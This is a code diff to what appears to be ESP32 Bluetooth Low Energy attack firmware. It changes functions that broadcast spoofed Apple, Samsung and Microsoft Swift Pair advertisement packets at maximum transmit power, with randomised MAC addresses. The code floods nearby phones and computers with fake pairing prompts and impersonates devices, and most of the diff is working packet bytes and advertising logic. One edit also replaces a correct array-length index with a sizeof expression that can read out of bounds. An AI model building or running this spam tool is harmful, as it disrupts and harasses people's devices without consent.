@@ -53,14 +53,14 @@ NimBLEAdvertisementData BLEModules::GetAdvertismentData(EBLEPayloadType type)
         case AppleJuice: {  // https://github.com/pr3y/Bruce/blob/main/src/modules/ble/ble_spam.cpp
             int randdevice = random(2);
             if (randdevice == 0) {
-                uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[rand() % (sizeof(IOS1) / sizeof(IOS1[0]))],
+                uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[random() % sizeof(IOS1)],
                                       0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                                       0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                                       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
                 AdvData.addData(std::string((char *)packet, 31));
             } else if (randdevice == 1) {
                 uint8_t packet[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
-                                      0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, IOS2[rand() % (sizeof(IOS2) / sizeof(IOS2[0]))],
+                                      0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, IOS2[random() % sizeof(IOS2)],
                                       0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00,
                                       0x00, 0x00};
                 AdvData.addData(std::string((char *)packet, 23));
@@ -219,12 +219,11 @@ NimBLEAdvertisementData BLEModules::selectSpooferDevices(uint8_t device_type, ui
     NimBLEAdvertisementData AdvData = NimBLEAdvertisementData();
     if (device_brand == BLE_SPOOFER_DEVICE_BRAND_APPLE) {
         Serial.println("[INFO] BLE Apple Spoofer Starting");
-        //uint8_t AdvData_Raw[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[(int)device_type],
-        //                           0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
-        //                           0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
-        //                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-        //AdvData.addData(std::string((char*)AdvData_Raw, 31));
-        AdvData.addData(std::string((char*)IOS1_1[(int)device_type], 31));
+        uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[(int)device_type],
+                              0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+                              0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+        AdvData.addData(std::string((char *)packet, 31));
     } else if (device_brand == BLE_SPOOFER_DEVICE_BRAND_SAMSUNG) {
         Serial.println("[INFO] BLE Samsung Spoofer Starting");
         uint8_t model = watch_models[(int)device_type].value;
@@ -292,24 +291,20 @@ void BLEModules::stopSpoofer() {
 }
 
 void BLEModules::initSpam() {
-    //NimBLEDevice::init("ESP32 Attack Tool");
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, MAX_TX_POWER); 
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER); 
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN , MAX_TX_POWER);
-
-    //NimBLEServer *pServer = NimBLEDevice::createServer();
-    //pAdvertising = pServer->getAdvertising();
-
-    esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
-    esp_ble_gap_set_rand_addr(null_addr);
 
     ble_initialized = true;
     Serial.println("[INFO] BLE Spam Initialized Successfully!");
 }
 
-
+/*
 void BLEModules::executeAppleSpam(EBLEPayloadType apple_mode)
 {
+    uint8_t macAddr[6];
+    generateRandomMac(macAddr);
+    esp_base_mac_addr_set(macAddr);
     NimBLEDevice::init("");
     NimBLEServer *pServer = NimBLEDevice::createServer();
     pAdvertising = pServer->getAdvertising();
@@ -322,8 +317,9 @@ void BLEModules::executeAppleSpam(EBLEPayloadType apple_mode)
     pAdvertising->start();
     vTaskDelay(20 / portTICK_PERIOD_MS);
     pAdvertising->stop();
-    //NimBLEDevice::deinit();
+    NimBLEDevice::deinit();
 }
+*/
 
 void BLEModules::executeSwiftpair(EBLEPayloadType type)
 {
@@ -333,11 +329,11 @@ void BLEModules::executeSwiftpair(EBLEPayloadType type)
     NimBLEDevice::init("");
     NimBLEServer *pServer = NimBLEDevice::createServer();
     pAdvertising = pServer->getAdvertising();
+    vTaskDelay(40 / portTICK_PERIOD_MS);
     NimBLEAdvertisementData advertisementData = GetAdvertismentData(type);
-    //pAdvertising->addServiceUUID(SERVICE_UUID);
     pAdvertising->setAdvertisementData(advertisementData);
     pAdvertising->start();
-    vTaskDelay(10 / portTICK_PERIOD_MS);
+    vTaskDelay(20 / portTICK_PERIOD_MS);
     pAdvertising->stop();
     NimBLEDevice::deinit();
 }
